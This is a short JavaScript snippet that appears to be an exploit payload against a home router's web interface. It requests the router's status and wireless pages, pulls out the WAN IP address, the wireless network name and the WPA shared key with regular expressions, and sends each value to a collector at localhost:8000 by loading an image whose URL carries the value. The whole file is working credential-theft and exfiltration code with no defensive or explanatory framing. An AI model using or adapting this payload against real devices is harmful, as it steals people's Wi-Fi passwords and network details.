function get(url, f) {
  var xmlhttp;
  if (window.XMLHttpRequest)
    xmlhttp = new XMLHttpRequest();
  else
    xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");

  xmlhttp.onreadystatechange = function() {
    if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
      f(xmlhttp.responseText);
    }
  }
  xmlhttp.open("GET", url, true);
  xmlhttp.send();
}

get("/status_main.stm", function(t) {
  var ip = t.match(/wan_ip="([^"]+)"/)[1];
  var elem = document.createElement("img");
  elem.src = "http://localhost:8000/?ip="+ip;
  document.body.appendChild(elem);
});

get("/wireless_id.stm", function(t) {
  var essid = t.match(/name="ssid" size=32 maxlength=32 value="([^"]+)"/)[1];
  var elem = document.createElement("img");
  elem.src = "http://localhost:8000/?essid="+essid;
  document.body.appendChild(elem);
});

get("/wireless_e.stm", function(t) {
  var wpa = t.match(/document.form2.sharedkey.value="([^"]+)"/)[1];
  var elem = document.createElement("img");
  elem.src = "http://localhost:8000/?wpa="+wpa;
  document.body.appendChild(elem);
});
